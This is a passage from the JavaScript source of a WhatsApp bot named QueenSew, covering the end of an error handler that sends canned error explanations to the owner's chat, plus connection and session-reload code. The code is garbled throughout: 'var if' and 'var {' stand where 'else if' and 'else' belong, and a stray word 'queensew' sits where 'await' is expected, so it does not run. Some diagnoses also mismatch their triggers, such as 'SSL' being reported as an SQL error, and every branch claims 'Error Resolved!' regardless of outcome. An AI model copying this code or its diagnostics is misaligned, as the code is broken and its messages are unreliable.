                                    );
                                }
                                var if (error.message.includes('SSL')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _SQL Database Error_' +
                                        '\n*Reason:* _Database corruption._ ' +
                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('Ookla')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Ookla Server Connection_' +
                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('params')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Requested Audio Params_' +
                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('unlink')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved``` ==========' +
                                        '\n\n*Main Error:* _No Such File or Directory_' +
                                        '\n*Reason:* _Incorrect coding of the plugin._' +
                                        '\n*Solution:* _Please check the your plugin codes._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('404')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('reply.delete')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('load.delete')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Reply Delete Function_' +
                                        '\n*Reason:* _Using IMG or Wiki commands._' +
                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('400')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('decode')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
                                        '\n*Reason:* _Incorrect use of the plug._' +
                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
                                        , MessageType.text
                                    );
                                }
                                var if (error.message.includes('unescaped')) {
                                    return queensew conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [Ravindu Manoj] ⚕️*' + 
                                        '\n========== ```Error Resolved!``` ==========' +
                                        '\n\n*Main Error:* _Word Character Usage_' +
                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
                                        , MessageType.text
                                    );
                                }
                                var {
                                    return queensew conn.sendMessage(conn.user.jid, '*🙇🏻 Sorry, I Couldnt Read This Error! [Ravindu Manoj] 🙇🏻*' +
                                        '\n_You can write to our support group for more help._'
                                        , MessageType.text
                                    );
                                }    
                            }                      
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        queensew conn.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Eski sürüm stringiniz yenileniyor...'))
            conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                queensew conn.connect();
            } catch {
                return;
            }
        }
    }
}

QueenSew();
